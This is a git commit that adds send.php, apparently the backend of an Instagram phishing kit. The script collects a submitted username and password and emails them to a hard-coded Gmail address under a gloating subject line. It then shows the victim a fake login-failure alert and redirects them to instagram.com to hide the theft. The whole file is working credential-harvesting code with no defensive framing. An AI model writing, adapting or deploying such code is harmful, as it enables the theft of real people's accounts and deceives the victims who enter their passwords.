f7d7e2b95b403b9c22c1a136be4efcdda06c69a8
MyNameIsEiji <135619255+MyNameIsEiji@users.noreply.github.com>
2023-06-05 19:51:54 +0700

    Add files via upload

---
+++ send.php
@@ -0,0 +1,26 @@
+<?php
+
+//varible setting
+$username = $_POST['u_name'];  // fetch username
+ $passcode = $_POST['pass'];  // fetch password
+ $subject = "Yeah Someone Login ! You Got IT";
+ $to ="khoirulyan.id@gmail.com";
+ 
+ $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
+ 
+
+
+// check input fields
+if (empty($username)|| empty($passcode)){ // name or message
+echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
+    window.history.go(-1);
+    </script>";
+}
+else 
+{ 
+    mail($to,$subject,$txt); // send an email 
+    echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
+     // Simulate an HTTP redirect:
+    window.location.replace('http://www.instagram.com');
+    </script>";
+}
